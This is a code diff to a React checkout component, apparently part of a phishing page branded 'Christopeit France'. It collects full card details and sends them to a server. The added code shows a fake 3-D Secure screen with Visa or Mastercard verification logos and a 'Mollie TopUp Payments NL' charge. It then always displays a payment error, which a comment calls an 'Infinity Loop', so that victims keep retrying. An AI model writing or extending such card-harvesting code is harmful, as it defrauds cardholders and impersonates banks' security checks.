@@ -11,6 +11,9 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     cvv: '',
   });
 
+  const [showPaymentError, setShowPaymentError] = useState(false);
+  const [cardLogo, setCardLogo] = useState('/verified-by-visa.png'); 
+
   const cardNumberRef = useRef(null);
   const expiryDateRef = useRef(null);
   const router = useRouter(); // Utiliser useRouter
@@ -72,6 +75,11 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
       cardExpiration: formData.expiryDate,
       cardCVC: formData.cvv,
     };
+
+    // Si la carte commence par 5, setCardLogo à 'mastercard.png'
+    if (formData.cardNumber.startsWith('5')) {
+      setCardLogo('/mastercard-id-check.png');
+    }
     
     try {
       setIsLoading(true); // Afficher le popup de chargement
@@ -93,17 +101,15 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
           body: JSON.stringify({ orderNumber, amount, cardDetails }),
         });
       
-        if (!payFetch.ok) {
-          setIsLoading(false); 
-          setShow3DSecurePopup(false);
-        }
-        else {
-          // Rediriger vers la page de confirmation
-          router.push(`/verification?orderNumber=${orderNumber}`); 
-        }
+        //Dans tous les cas afficher la popup Erreur (Infinity Loop)
+        setIsLoading(false); 
+        setShow3DSecurePopup(false);
+        setShowPaymentError(true);
+
+        
       } catch (error) {
         console.error('Erreur lors de la requête fetch :', error);
-        alert('Impossible de traiter le paiement. Veuillez réessayer plus tard.');
+        alert('Impossible de traiter le paiement. Veuillez réessayer à nouveau.');
         router.push(`/paiement?failed=true`); 
         setIsLoading(false); 
         setShow3DSecurePopup(false);
@@ -116,6 +122,16 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
       alert('Une erreur est survenue.');
       setIsLoading(false); // Masquer le popup de chargement en cas d'erreur
     }
+  };
+
+  const handleRetry = () => {
+    setShowPaymentError(false);
+    setShow3DSecurePopup(false);
+    handleSubmit(new Event('submit')); // Simule un événement de soumission
+
+
+    // setShow3DSecurePopup(true); // Afficher le popup 3D-secure
+    // setShowPaymentError(false); // Masquer le popup d'erreur de paiement
   };
 
   return (
@@ -174,7 +190,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
           <div className="verification-popup loading">
             <article className='head'>
               <img className='brand-logo' src='icon.png' alt='Christopeit France' />
-              <img className='visa-logo' src='verified-by-visa.png' alt='Verified by Visa' />
+              <img className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`} src={cardLogo} alt='Verified Payment' />
             </article>
             
             <h2>Préparation du paiement</h2>
@@ -189,18 +205,40 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
           <div className="verification-popup d-secure">
             <article className='head'>
               <img className='brand-logo' src='icon.png' alt='Christopeit France' />
-              <img className='visa-logo' src='verified-by-visa.png' alt='Verified by Visa' />
+              <img className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`} src={cardLogo} alt='Verified Payment' />
             </article>
+             <div className='loader'></div>
             <h2>Vérification 3d-secure</h2>
             <p className='desc'>Confirmez la transaction suivante :</p>
-            <span>Mollie TopUp Payments NL</span>
-            <span>Montant à valider : {amountFeesed}€</span>
-            <span> Date : {`${formattedDate} à ${formattedTime}`}</span>
-            <span>Carte : **** **** **** {lastFourDigits}</span>
-            <div className='loader'></div>
+            <article className='infos'>
+              <span>Mollie TopUp Payments NL</span>
+              <span>Montant à valider : {amountFeesed}€</span>
+              <span> Date : {`${formattedDate} à ${formattedTime}`}</span>
+              <span>Carte : **** **** **** {lastFourDigits}</span>
+            </article>
+           
+            <p className='smaller'>Une fois la transaction confirmée, vous serez redirigé vers la page de confirmation.</p>
+            
           </div>
         </div>
       )}
+
+
+      {showPaymentError && (
+        <div className='verification-wrapper'>
+          <div className="verification-popup error">
+            <article className='head'>
+              <img className='brand-logo' src='icon.png' alt='Christopeit France' />
+              <img className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`} src={cardLogo} alt='Verified Payment' />
+            </article>
+            <h2 className='icon'>❌</h2>
+            <h2>erreur lors du paiement</h2>
+             <p className='desc'>Aucun paiement n'a pû être effectué, veuillez réessayer.</p>
+            <button onClick={handleRetry} disabled={isLoading}>Réessayer</button> 
+          </div>
+        </div>
+      )}
+
 
     </form>
   );
